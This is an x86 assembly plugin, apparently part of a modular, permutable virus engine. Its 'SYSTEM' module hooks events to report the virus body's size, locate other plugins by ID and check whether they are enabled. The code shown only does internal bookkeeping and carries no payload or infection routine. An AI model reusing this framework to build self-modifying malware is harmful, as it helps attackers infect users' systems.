   ; SYSTEM
   ; ~~~~~~
   ; - performs some special actions

   include                 plugin.inc
                           PLUGIN_START    SYSTEM, CODE32, PERMUTABLE

   handleevent:            hookevent EV_SYSTEM_GET_VIR_SIZE, system_getvirsize
                           hookevent EV_SYSTEM_GET_PLUGIN_OFFS, system_getpluginoffs
                           hookevent EV_SYSTEM_PLUGIN_EXIST, system_pluginexist
                           stc
                           retn

   ; returns: ESI=virstart, ECX=virsize

   system_getvirsize:      lea     esi, [ebp-size plugin_struc]
                           xor     ecx, ecx
   __cycle:                add     ecx, [esi+ecx].plugin_size
                           cmp     dword ptr [esi+ecx], 0
                           jne     __cycle
                           add     ecx, 4  ; EOF sign
                           clc
                           retn

   ; output: ESI=virbase             -- VA
   ;         ECX=pluginbase          -- RVA   (==0 if not found)
   ;         EAX=pluginbase=ESI+ECX  -- VA    (==0 if not found)

   system_getpluginoffs:   lea     esi, [ebp-size plugin_struc]
                           xor     ecx, ecx
   __cycle:                cmp     [esi+ecx].plugin_id, edx
                           je      __retn
                           add     ecx, [esi+ecx].plugin_size
                           cmp     dword ptr [esi+ecx], 0
                           jne     __cycle
                           xor     eax, eax
                           xor     ecx, ecx
                           clc
                           retn
   __retn:                 lea     eax, [esi+ecx]
                           clc
                           retn


   ; input:   EDX=plugin ID
   ; returns: NZ=plugin exists (jnz)
   ;          ZR=plugin not found (jz)

   system_pluginexist:     pusha
                           call    system_getpluginoffs
                           or      eax, eax
                           jz      __exit
                           mov     eax, [eax].plugin_flags
                           not     eax
                           test    eax, FL_PGN_DISABLED
   __exit:                 popa
                           clc
                           retn

                           PLUGIN_END
